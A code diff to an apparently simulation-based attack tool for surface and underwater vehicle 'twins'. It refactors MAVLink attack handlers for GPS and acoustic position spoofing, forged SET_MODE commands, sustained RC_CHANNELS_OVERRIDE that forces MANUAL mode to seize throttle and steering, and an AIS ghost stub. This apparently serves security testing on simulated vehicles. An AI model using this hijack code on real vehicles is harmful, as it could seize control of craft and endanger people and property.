@@ -292,12 +292,17 @@ class Backend:
     def attack(self, name):
         if not self.conn:
             return
-        self.active_attack = name; c = self.conn
-        if name in ("GPS spoof", "Acoustic spoof"):
+        c = self.conn
+        norm = name.lower().replace(" ", "_").replace("-", "_")
+        self.active_attack = name
+
+        if norm in ("gps_spoof", "gps_spoofing", "acoustic_spoof", "acoustic_spoofing"):
             if self.domain == "underwater" and getattr(self, "_ac", None):
                 # submerged: the position channel is acoustic/ExternalNav, not GPS
                 with self._ac._lock:
-                    self._ac.state.mode = "step"; self._ac.state.start_time = time.time(); self._ac.state.active = True
+                    self._ac.state.mode = "step"
+                    self._ac.state.start_time = time.time()
+                    self._ac.state.active = True
                 self.log("ATTACK · acoustic/ExternalNav position spoof (step)")
             else:
                 try:
@@ -305,45 +310,47 @@ class Backend:
                     self.log("ATTACK · GPS spoof injected (FDM relay step)")
                 except OSError:
                     self.log("GPS spoof needs the FDM relay (surface twins)")
-        elif name == "C2 mode":
+        elif norm in ("c2_mode",):
             mm = c.mode_mapping() or {}
             tgt = next((m for m in ("MANUAL", "HOLD", "ALT_HOLD") if m in mm), None)
             if tgt:
                 c.mav.set_mode_send(c.target_system, mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mm[tgt])
                 self.log(f"ATTACK · forged SET_MODE → {tgt}")
-        elif name == "C2 override":
-            # RC_CHANNELS_OVERRIDE only drives the actuators directly in MANUAL
-            # (GUIDED's position controller ignores RC and would otherwise fight
-            # a brief override right back to the waypoint) -- forcing MANUAL
-            # first is what makes this attack actually seize the vehicle, not
-            # just queue a command that gets silently discarded. Sustained
-            # continuously (not a short burst) until STOP, matching how
-            # tools/test_target.py's validated RC-override check drives it.
+        elif norm in ("c2_override", "c2_replay", "c2_hijack"):
             mm = c.mode_mapping() or {}
             if "MANUAL" in mm:
                 c.set_mode(mm["MANUAL"])
-                time.sleep(0.5)
+                time.sleep(0.3)
             self._override_stop.clear()
             self.log("ATTACK · RC_CHANNELS_OVERRIDE — throttle seized (MANUAL forced)")
-            while not self._override_stop.is_set():
+            threading.Thread(target=self._run_override_worker, daemon=True).start()
+        elif norm in ("ais_spoof", "ais_ghost", "ais_spoofing"):
+            self.log("ATTACK · AIS ghost contact (operator-layer)")
+
+    def _run_override_worker(self):
+        c = self.conn
+        if not c:
+            return
+        while not self._override_stop.is_set():
+            try:
                 if self.domain == "underwater":
-                    # Channel 4: Yaw (1850=hard right), Channel 5: Surge (1850=full surge)
                     c.mav.rc_channels_override_send(c.target_system, c.target_component,
-                                                     1500, 1500, 1500, 1850, 1850, 1500, 0, 0)
+                                                    1500, 1500, 1500, 1850, 1850, 1500, 0, 0)
                 else:
                     c.mav.rc_channels_override_send(c.target_system, c.target_component,
-                                                     1800, 0, 1850, 0, 0, 0, 0, 0)
-                time.sleep(0.1)
-        elif name == "AIS ghost":
-            self.log("ATTACK · AIS ghost contact (operator-layer)")
+                                                    1800, 0, 1850, 0, 0, 0, 0, 0)
+            except Exception:
+                break
+            time.sleep(0.1)
 
     def stop_attack(self):
         name = self.active_attack
         if not name:
             return
         c = self.conn
-        if name in ("GPS spoof", "Acoustic spoof"):
-            if self.domain == "underwater" and self._ac:
+        norm = name.lower().replace(" ", "_").replace("-", "_")
+        if norm in ("gps_spoof", "gps_spoofing", "acoustic_spoof", "acoustic_spoofing"):
+            if self.domain == "underwater" and getattr(self, "_ac", None):
                 with self._ac._lock:
                     self._ac.state.active = False
             else:
@@ -351,18 +358,24 @@ class Backend:
                     open(f"/tmp/mcr_run/{self.twin}/relay.fifo", "w").write("off\n")
                 except OSError:
                     pass
-        elif name == "C2 override":
+        elif norm in ("c2_override", "c2_replay", "c2_hijack"):
             self._override_stop.set()
             if c:
-                c.mav.rc_channels_override_send(c.target_system, c.target_component, 0, 0, 0, 0, 0, 0, 0, 0)
-                mm = c.mode_mapping() or {}
-                if "GUIDED" in mm:   # recover from the forced MANUAL, like C2 mode's stop
-                    c.set_mode(mm["GUIDED"])
-        elif name == "C2 mode":
+                try:
+                    c.mav.rc_channels_override_send(c.target_system, c.target_component, 0, 0, 0, 0, 0, 0, 0, 0)
+                    mm = c.mode_mapping() or {}
+                    if "GUIDED" in mm:
+                        c.set_mode(mm["GUIDED"])
+                except Exception:
+                    pass
+        elif norm in ("c2_mode",):
             if c:
-                mm = c.mode_mapping() or {}
-                if "GUIDED" in mm:
-                    c.set_mode(mm["GUIDED"])
+                try:
+                    mm = c.mode_mapping() or {}
+                    if "GUIDED" in mm:
+                        c.set_mode(mm["GUIDED"])
+                except Exception:
+                    pass
         self.active_attack = None
         self.log(f"attack stopped — {name}")
 
@@ -376,7 +389,7 @@ class Backend:
                 pass
             self.conn = None
         if self.twin:
-            subprocess.Popen(["bash", f"{REPO}/tools/run_vehicle.sh", f"vehicle_twins/{self.twin}", "down"],
+            subprocess.Popen(["bash", f"{REPO}/communication/run_vehicle.sh", f"{REPO}/application/twins/{self.twin}", "down"],
                              cwd=REPO, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
